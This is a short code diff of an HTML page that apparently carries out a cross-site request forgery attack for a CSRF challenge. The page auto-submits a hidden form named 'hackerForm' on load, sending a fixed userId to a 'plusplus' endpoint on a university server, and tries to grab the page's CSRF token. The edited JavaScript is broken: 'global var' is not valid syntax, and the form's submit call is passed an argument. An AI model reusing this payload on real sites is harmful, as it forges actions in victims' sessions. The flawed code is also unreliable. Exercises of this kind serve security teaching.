@@ -5,7 +5,7 @@
 <head>
 <title>Hello there</title>
 </head>
-<body onload="submitForm(csrf)">
+<body onload="submitForm()">
   <img src="http://klockren.se/klockren.png" style="width: 500px;" />
   <form name="hackerForm" action="https://snickerboa.it.liu.se/user/csrfchallengetwo/plusplus" method="POST">
     <input type="text" name="userId" value="87d0d107b1521d76bb260cc345c13bf90f6f4cd6" />
@@ -14,7 +14,7 @@
   </form>
 <script> 
 function submitForm(){
-  var csrf = document.querySelector('meta[name="csrfToken"]').content;
+  global var csrf = document.querySelector('meta[name="csrfToken"]').content;
   document.hackerForm.submit(csrf); 
  }
 </script> 
